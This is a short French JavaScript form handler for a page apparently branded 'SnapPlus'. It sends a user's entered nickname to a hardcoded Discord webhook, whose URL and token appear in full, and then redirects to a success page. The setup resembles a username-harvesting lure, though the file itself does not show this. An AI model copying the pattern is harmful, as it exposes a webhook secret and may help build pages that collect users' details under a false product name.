```javascript
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536105952720330752/XsDrxHH4dWxbBcT4EgA4zP42BlF5bFYSbOVDAUaQbm83D15HTrfifVL-FwGEyhoXlUCC";

const form = document.getElementById("pseudoForm");
const pseudoInput = document.getElementById("pseudo");
const submitButton = document.getElementById("submitButton");
const errorMessage = document.getElementById("errorMessage");
const buttonText = document.querySelector(".button-text");

console.log("form :", form);
console.log("pseudoInput :", pseudoInput);
console.log("submitButton :", submitButton);
console.log("errorMessage :", errorMessage);
console.log("buttonText :", buttonText);

if (!form || !pseudoInput || !submitButton || !errorMessage || !buttonText) {
  console.error("Un ou plusieurs éléments HTML sont introuvables.");
} else {

  form.addEventListener("submit", async (event) => {
    event.preventDefault();

    const pseudo = pseudoInput.value.trim();

    errorMessage.textContent = "";

    if (pseudo.length < 2) {
      errorMessage.textContent =
        "Ton pseudo doit contenir au moins 2 caractères.";

      pseudoInput.focus();
      return;
    }

    submitButton.disabled = true;
    pseudoInput.disabled = true;
    buttonText.textContent = "Envoi…";

    try {
      console.log("Pseudo :", pseudo);

      const response = await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `📸 Nouveau pseudo SnapPlus : **${pseudo}**`
        })
      });

      console.log("Statut HTTP :", response.status);

      if (!response.ok) {
        throw new Error(`Discord HTTP ${response.status}`);
      }

      window.location.href = "success.html";

    } catch (error) {
      console.error("Erreur :", error);

      errorMessage.textContent =
        "Impossible d'envoyer le pseudo.";

      submitButton.disabled = false;
      pseudoInput.disabled = false;
      buttonText.textContent = "Continuer →";
    }
  });

}
```
